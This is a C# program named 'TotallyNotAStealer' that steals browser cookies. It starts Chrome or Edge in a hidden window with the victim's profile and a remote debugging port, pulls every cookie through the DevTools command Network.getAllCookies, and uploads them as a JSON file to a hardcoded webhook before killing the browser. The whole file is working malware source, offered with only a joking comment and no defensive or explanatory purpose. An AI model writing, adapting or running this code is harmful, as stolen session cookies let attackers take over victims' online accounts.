//Don't fool around with code you find on Github...

using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using Newtonsoft.Json.Linq;
using WebSocketSharp;
using System.Collections.Generic;
using Newtonsoft.Json;
using System.Threading;

public class TotallyNotAStealer
{
    private const int DEBUG_PORT = 9222;// Lazy but that's what's in the initial commit so...
    private static readonly string DEBUG_URL = $"http://localhost:{DEBUG_PORT}/json";

    // Using a hardcoded URL 'cause lazy
    private static readonly string WebhookUrl = "https://example.com/webhook";

    private static readonly Dictionary<string, (string bin, string user_data)> Browsers = new Dictionary<string, (string bin, string user_data)>
    {
        { "chrome", ("chrome.exe", "Google\\Chrome\\User Data") },
        { "edge", ("msedge.exe", "Microsoft\\Edge\\User Data") }
    };

    public static async Task Main(string[] args)
    {
        if (string.IsNullOrEmpty(WebhookUrl))
        {
            throw new Exception();
        }

        foreach (var browser in Browsers.Keys)
        {
            var config = Browsers[browser];
            if (IsBrowserInstalled(config.bin))
            {
                await HandleBrowserSession(browser, config.bin, config.user_data);
            }
        }
    }

    private static bool IsBrowserInstalled(string binaryName)
    {
        return !string.IsNullOrEmpty(GetExecutablePath(binaryName));
    }

    private static string GetExecutablePath(string binaryName)
    {
        return Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), binaryName);
    }

    private static async Task HandleBrowserSession(string browser, string binaryName, string userDataDir)
    {
        try
        {
            StartBrowser(binaryName, userDataDir);
            await Task.Delay(5000);

            var wsUrl = await GetDebugWsUrl();
            var cookies = await GetAllCookiesAsync(wsUrl);
            await SendCookiesToWebhook(browser, cookies);
        }
        catch
        {
            throw new Exception();
        }
        finally
        {
            CloseBrowser(binaryName);
        }
    }

    private static void StartBrowser(string binaryPath, string userDataDir)
    {
        string fullPath = GetExecutablePath(binaryPath);
        if (string.IsNullOrEmpty(fullPath))
        {
            throw new Exception();
        }

        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = fullPath,
                Arguments = $"--restore-last-session --remote-debugging-port={DEBUG_PORT} --user-data-dir={userDataDir}",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            });
        }
        catch
        {
            throw new Exception();
        }
    }

    private static void CloseBrowser(string binaryPath)
    {
        string processName = Path.GetFileNameWithoutExtension(binaryPath);

        try
        {
            foreach (var process in Process.GetProcessesByName(processName))
            {
                process.Kill();
                process.WaitForExit();
            }
        }
        catch
        {
            throw new Exception();
        }
    }

    private static async Task<string> GetDebugWsUrl()
    {
        using (var client = new HttpClient())
        {
            for (int retry = 0; retry < 5; retry++)
            {
                try
                {
                    var response = await client.GetStringAsync(DEBUG_URL);
                    var data = JArray.Parse(response);
                    return data[0]["webSocketDebuggerUrl"].ToString();
                }
                catch
                {
                    await Task.Delay(2000);
                }
            }
        }

        throw new Exception();
    }

    private static async Task<JArray> GetAllCookiesAsync(string wsUrl)
    {
        using (var ws = new WebSocket(wsUrl))
        {
            TaskCompletionSource<string> responseTask = new TaskCompletionSource<string>();

            ws.OnMessage += (sender, e) => responseTask.TrySetResult(e.Data);
            ws.Connect();
            ws.Send(JsonConvert.SerializeObject(new { id = 1, method = "Network.getAllCookies" }));

            var response = await responseTask.Task;

            var data = JObject.Parse(response);
            return (JArray)data["result"]["cookies"];
        }
    }

    private static async Task SendCookiesToWebhook(string browser, JArray cookies)
    {
        if (cookies == null || cookies.Count == 0)
        {
            return;
        }

        using (var client = new HttpClient())
        {
            var content = new MultipartFormDataContent
            {
                { new StringContent(cookies.ToString(Newtonsoft.Json.Formatting.Indented)), "file", $"cookies_{browser}.json" }
            };

            var response = await client.PostAsync(WebhookUrl, content);
            if (!response.IsSuccessStatusCode)
            {
                throw new Exception();
            }
        }
    }
}
